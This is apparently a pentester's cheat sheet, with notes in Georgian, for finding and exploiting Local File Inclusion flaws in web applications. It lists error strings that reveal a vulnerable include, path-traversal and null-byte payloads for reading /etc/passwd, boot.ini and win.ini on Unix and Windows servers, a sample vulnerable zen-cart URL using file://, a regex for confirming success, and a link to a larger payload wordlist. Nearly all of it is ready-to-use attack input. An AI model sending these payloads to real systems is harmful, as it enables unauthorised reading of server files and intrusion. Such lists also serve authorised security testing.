### LFI 

#### Errors:
```
Detect Payload: abc.txt
```
request-ის შემდეგ აბრუნებს შემდეგ შეცდომებს respons-ში

##### Java Errors:
```
java.io.FileNotFoundException
java.lang.Exception
java.lang.IllegalArgumentException
java.net.MalformedURLException
```
##### PHP Errors:
```
fread\\(\\)
for inclusion \'\\(include_path=
Failed opening required
<b>Warning</b>:  file\\('
<b>Warning</b>:  file_get_contents\\('
open_basedir restriction in effect
```

##### Unix Payloads:
```
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
../../../../../../../../../../../../../../../etc/passwd
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
/etc/passwd
```

შემდეგი სახის LFI - ის ტესტირება, როგორიცაა http://website/zen-cart/extras/curltest.php?url=file:///etc/passwd
```
file:///etc/passwd
/etc/passwd%00
/etc/passwd%00.html
/etc/passwd%00.ext
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext
```

##### Windows Payloads:
```
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
../../../../../../../../../../../../../../../boot.ini
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
C:\\boot.ini
C:\\boot.ini%00
C:\\boot.ini%00.html
%SYSTEMROOT%\\win.ini
%SYSTEMROOT%\\win.ini%00
%SYSTEMROOT%\\win.ini%00.html
file:///C:/boot.ini
file:///C:/win.ini
C:\\boot.ini%00.ext
%SYSTEMROOT%\\win.ini%00.ext
```
ვაკვირდებით respons და ვეძებთ 
##### Regexp:
```
root:x|for 16-bit app support|boot loader
```

სასურველი payload-ების ვორდლისტი
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders



